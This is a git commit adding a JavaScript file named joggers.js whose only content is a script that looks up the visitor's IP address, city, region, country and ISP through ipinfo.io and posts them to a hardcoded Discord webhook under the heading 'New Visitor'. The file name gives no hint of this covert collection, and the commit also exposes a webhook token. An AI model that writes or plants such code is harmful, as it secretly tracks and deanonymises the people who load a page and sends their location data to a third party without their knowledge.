e9c4b7dcfc9ea03263229687997460b19bfe91e5
Dark Man / <170863039+darkman-git-hub@users.noreply.github.com>
2025-04-10 16:30:40 +0100

    Create joggers.js

---
+++ joggers.js
@@ -0,0 +1,11 @@
+fetch("https://ipinfo.io/json")
+  .then(res => res.json())
+  .then(data => {
+    fetch("https://discord.com/api/webhooks/1359895770555224175/9x4FOaqCX7Xvbh7O-KZinxsO-SA-sMgEwXhllZiKFQ7NPAaCm9X5jzGYcsbyEcvorBJD", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        content: `**New Visitor**\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nISP: ${data.org}`
+      })
+    });
+  });
